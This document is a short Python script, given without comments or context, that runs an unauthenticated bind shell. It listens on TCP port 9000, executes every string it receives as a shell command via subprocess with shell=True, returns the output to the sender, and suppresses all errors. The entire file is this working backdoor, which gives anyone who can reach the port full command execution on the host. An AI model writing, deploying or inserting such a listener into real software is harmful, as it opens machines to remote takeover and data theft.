import socket
import subprocess

TCP_IP = socket.gethostname()
TCP_PORT = 9000

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((TCP_IP, TCP_PORT))
while True:
    try:
        socket.listen(1)
        conn, addr = socket.accept()
        while True:
            data = conn.recv(8192)
            
            if not data:
                break
        
            command = data.decode()
            output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            conn.send(output.stdout)
            if not output.stdout:
                conn.send(b' ')


    except:
        pass
